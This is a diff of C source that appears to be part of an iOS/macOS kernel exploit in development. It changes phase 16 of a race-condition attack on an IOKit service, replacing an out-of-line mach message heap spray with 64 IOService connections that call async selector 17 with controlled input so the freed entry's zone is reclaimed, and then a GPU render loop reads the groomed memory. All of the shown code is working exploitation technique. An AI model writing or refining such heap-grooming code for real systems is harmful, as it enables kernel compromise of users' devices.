@@ -19818,7 +19818,7 @@ new_modes:
 
             uint64_t inp16[3] = {1, 2, 3};
 
-            for (int iter = 0; iter < 20; iter++) {
+            for (int iter = 0; iter < 10; iter++) {
                 /* ---- STEP 1: Race WITHOUT render loop ---- */
                 io_connect_t cs16[8];
                 int have16[8];
@@ -19856,50 +19856,36 @@ new_modes:
                 rlog("  [%d] race done, spam=%llu\n", iter,
                      (unsigned long long)p13_spam_count);
 
-                /* ---- STEP 2: Groom with OOL mach messages ---- */
-                mach_port_t groom_port16 = MACH_PORT_NULL;
+                /* ---- STEP 2: Groom with sel17 (same zone as freed entry) ---- */
+                /* OOL mach_msg goes to kalloc_data — wrong zone.
+                 * sel17 entries go to the SAME type-specific zone.
+                 * Open fresh connections, call sel17 with controlled input. */
+                #define GROOM16_CONNS 64
+                io_connect_t groom_cs16[GROOM16_CONNS];
+                int groom_ok16[GROOM16_CONNS];
                 int groom_sent = 0;
 
-                if (rounds <= 162 || rounds == 163) {
-                    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE,
-                                       &groom_port16);
-                    mach_port_insert_right(mach_task_self(), groom_port16,
-                                           groom_port16, MACH_MSG_TYPE_MAKE_SEND);
-                    /* Raise queue limit */
-                    mach_port_limits_t limits = { .mpl_qlimit = MACH_PORT_QLIMIT_MAX };
-                    mach_port_set_attributes(mach_task_self(), groom_port16,
-                        MACH_PORT_LIMITS_INFO, (mach_port_info_t)&limits,
-                        MACH_PORT_LIMITS_INFO_COUNT);
-
-                    struct {
-                        mach_msg_header_t header;
-                        mach_msg_body_t body;
-                        mach_msg_ool_descriptor_t ool;
-                    } ool_msg;
-                    memset(&ool_msg, 0, sizeof(ool_msg));
-                    ool_msg.header.msgh_bits = MACH_MSGH_BITS_COMPLEX |
-                        MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
-                    ool_msg.header.msgh_size = sizeof(ool_msg);
-                    ool_msg.header.msgh_remote_port = groom_port16;
-                    ool_msg.header.msgh_local_port = MACH_PORT_NULL;
-                    ool_msg.body.msgh_descriptor_count = 1;
-                    ool_msg.ool.address = groom16;
-                    ool_msg.ool.size = 32; /* target kalloc.32 (covers 24-byte entries) */
-                    ool_msg.ool.deallocate = 0;
-                    ool_msg.ool.copy = MACH_MSG_VIRTUAL_COPY;
-                    ool_msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
-
-                    for (int g = 0; g < 512; g++) {
-                        kern_return_t mr = mach_msg(&ool_msg.header,
-                            MACH_SEND_MSG | MACH_SEND_TIMEOUT,
-                            sizeof(ool_msg), 0, MACH_PORT_NULL, 10,
-                            MACH_PORT_NULL);
-                        if (mr == MACH_MSG_SUCCESS) groom_sent++;
-                        else break;
+                if (rounds <= 163) {
+                    for (int g = 0; g < GROOM16_CONNS; g++) {
+                        groom_ok16[g] = (IOServiceOpen(svc16, mach_task_self(), 0,
+                                         &groom_cs16[g]) == KERN_SUCCESS);
+                        if (groom_ok16[g]) {
+                            mach_port_t gwp = MACH_PORT_NULL;
+                            mach_port_allocate(mach_task_self(),
+                                MACH_PORT_RIGHT_RECEIVE, &gwp);
+                            mach_port_insert_right(mach_task_self(), gwp, gwp,
+                                MACH_MSG_TYPE_MAKE_SEND);
+                            uint64_t gref = 0xAA00000000000000ULL | g;
+                            IOConnectCallAsyncMethod(groom_cs16[g], 17, gwp,
+                                &gref, 1, NULL, 0, g16, 24, NULL, NULL,
+                                NULL, NULL);
+                            mach_port_deallocate(mach_task_self(), gwp);
+                            groom_sent++;
+                        }
                     }
                 }
 
-                rlog("  [%d] groom sent=%d\n", iter, groom_sent);
+                rlog("  [%d] groom sent=%d (sel17 conns)\n", iter, groom_sent);
 
                 /* ---- STEP 3: Start render loop → GPU reads groomed data ---- */
                 int did_render = (rounds != 164);
@@ -19914,15 +19900,19 @@ new_modes:
                     rlog("  [%d] render done, frames=%d\n", iter, p13_render_frames);
                 }
 
-                /* ---- STEP 4: Cleanup ---- */
-                if (groom_port16 != MACH_PORT_NULL)
-                    mach_port_destroy(mach_task_self(), groom_port16);
+                /* ---- STEP 4: Cleanup — close groom connections ---- */
+                for (int g = 0; g < GROOM16_CONNS; g++) {
+                    if (groom_ok16[g]) {
+                        IOServiceClose(groom_cs16[g]);
+                        groom_ok16[g] = 0;
+                    }
+                }
 
                 rlog("  [%d] survived (%s)\n", iter,
                      did_render ? "with render" : "no render");
             }
 
-            rlog("  Phase 16: All 20 iterations survived!\n");
+            rlog("  Phase 16: All 10 iterations survived!\n");
             IOObjectRelease(svc16);
         }
         phase16_done:
